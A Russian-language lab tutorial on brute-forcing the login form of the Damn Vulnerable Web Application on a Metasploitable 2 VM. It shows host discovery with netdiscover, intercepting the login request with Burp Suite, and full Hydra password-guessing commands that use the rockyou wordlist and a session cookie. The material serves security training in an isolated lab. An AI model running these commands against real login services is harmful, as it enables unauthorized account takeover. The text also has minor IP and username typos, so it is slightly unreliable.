Часть 3. Раздел Brute Force - Burpsuite и Hydra подбор пароля Damn Vulnerable Web Application (DVWA) в metasploitable-linux-2.0.0

Предполагается что все действия выполняются на виртуальных машинах VirtualBox.

Необходимо определить IP с машиной Metasploitable 2. Для этого сначала определим наш IP и маску подсети, для этого дадим команду в терминале Kali:

ifconfig

В результатах вывода команды выше, можно увидеть такую строку:

inet 10.0.2.4 netmask 255.255.255.0

То есть наш IP 10.0.2.4 а диапазон IP адресов нашей сети 10.0.2.0/24 (это обяснялось ранее в предыдущих статьях).

Для обнаружения других компьютеров в сети и в том числе нашей удаленной машины Metasploitable 2, дадим команду в терминале Kali:

sudo netdiscover -r 10.0.2.0/24

В выводе команды:

10.0.2.2 08:00:27:3a:17:ed 1 60 PCS Systemtechnik GmbH 10.0.2.3 08:00:27:f1:18:5a 1 60 PCS Systemtechnik GmbH

10.0.2.2 - это виртуальный роутер, который управляет нашей сетью.

10.0.2.3 - это наша машина (по логике) с Metasploitable 2.

Проверим связь между нашей Kali и удаленной ВМ Metasploitable 2, дадим команду:

ping 10.0.2.3

Если сеть в VirtualBox настроена правильно, видим пинг идет, связь есть.

На Kali открываем веб- браузер Mozilla Firefox и в строку адреса вводим IP удаленной Metasploitable 2. После открытия страницы, нажимаем ссылку на странице DVWA.

В адресной строке браузера появился адрес (после нажатия ссылки DVWA):

http://10.0.2.3/dvwa/login.php

То есть после открытия веб- браузера на эту страницу DVWA можно было бы перейти сразу по ссылке:

http://10.0.2.3/dvwa/

И откроется та же страница DVWA входа.

На форме входа в DVWA логин/пароль следующие: admin/password.

Далее мы будем настраивать программу Burpsuite и настраивать веб-браузер Mozilla Firefox для работы с Burpsuite, эта программа позволяет перехватывать http трафик и смотреть заголовки запросов.

Обновим программу Burpsuite, команды терминала Kali Linux:

sudo apt update
sudo apt install burpsuite

Далее нам нужно настроить Burpsuit, а затем Firefox браузер.

Сначала настроим Burpsuit. Запустим программу командой в терминале Kali Linux:

burpsuite

После запуска команды в терминале появляется такое окно:

Нажимаем кнопку внизу Continue with Burp Suite Community Edition.

В следующем окне выбираем Temporary project in memory и жмем Next.

В следующем окне просто жмем кнопку Start Burp (скриншот ниже):

Далее необходимо убедится, что Burp слушает порт 8080, для этого открыть Proxy->Options (или в новых версиях Settings → Tools → Proxy).

Открывается окно, видим настройки правильные 127.0.0.1:8080 (скриншот ниже):

Если есть Listener на 127.0.0.1:8080 — всё нормально. У нас есть.

Далее настраиваем Mozilla Firefox в Kali Linux.

Запускаем Mozilla Firefox в Kali Linux. Справа вверху нажимаем на три полоски (скриншот ниже):

Когда мы нажали три полоски появилось меню, в нем выбираем пункт Settings (скриншот ниже):

После нажатия на пункт Settings в окне браузера появляются настройки, необходимо прокрутить страницу в самый низ, до пункта Network Settings - и рядом с пунктом нажать кнопку Settings ... (скриншот ниже):

После нажатия Network Settings -> Settings... появляется окно, необходимо выбрать пункт Manual proxy configuration, указать пункт HTTP Proxy 127.0.0.1 и порт 8080, так же ниже под этим полем ввода поставить галочку Also use this proxy for HTTPS (или в других версиях браузера может быть Use this proxy server for all protocols). Далее в этом окне нажать OK.

После нажатия кнопки OK закрываем закладку браузера Settings.

Все, браузер Firefox настроен для работы с Burpsuit.

Не закрываем Burpsuite, проверяем работу.

В Firefox откройте:

http://10.0.0.3/dvwa/

Вводим логин/пароль admin/password. Выбираем Security Level - low. Выбираем ссылку уязвимости Brute Force.

Далее в Burpsuite включаем перехват - нажимаем кнопку Intercept off и надпись на кнопке меняется после нажатия на Intercept on. То есть если мы хотим начать перехват нажимаем кнопку Intercept, и если мы хотим остановить перехват (например для обычного просмотра страниц в браузере) то нажимаем ту же кнопку Intercept.

Возвращаемся в Firefox, и вводим логин/пароль например amin/randompassword.

Автоматически поверх всплыло окно Burpsuite:

Для дальнейшего взлома нам важно в выводе эти поля:

GET /dvwa/vulnerabilities/brute/?username=admin&password=randompassword&Login=Login HTTP/1.1

В этой строке нам пригодиться:

username=admin&password=randompassword&Login=Login

И в следующей строке:

Cookie: security=low; PHPSESSID=023d51270ddc266b8719c2c40820602e

Нам пригодиться в будущем:

security=low; PHPSESSID=023d51270ddc266b8719c2c40820602e

Далее в статье мы будем использовать программу Hydra для подбора пароля в эту форму, и программа Hydra будет использовать в командной строке данные которые мы только что получили при помощи программы Burpsuite.

Если вы хотите закончить работу с Burpsuite и работать с Firefox в обычном режиме, то необходимо вернуть первоначальные настройки Firefox.

Запускаем второй (еще один) терминал, так как в первом терминале у нас Burpsuite (его уже можно закрыть). В терминале вводим команду hydra для подбора пароля:

hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.0.2.3 http-get-form "/dvwa/vulnerabilities/brute/:username=^USER^&password=^PASS^&Login=Login:H=Cookie:PHPSESSID=023d51270ddc266b8719c2c40820602e;security=low:F=Username and/or password incorrect."

И видим результат пароль password:

Так же в команду hydra можно добавить дополнительную вербализацию ключ -V, и вывод работы команды на экране будет более подробный, например:

hydra -V -l admin -P /usr/share/wordlists/rockyou.txt 10.0.2.3 http-get-form "/dvwa/vulnerabilities/brute/:username=^USER^&password=^PASS^&Login=Login:H=Cookie:PHPSESSID=023d51270ddc266b8719c2c40820602e;security=low:F=Username and/or password incorrect."
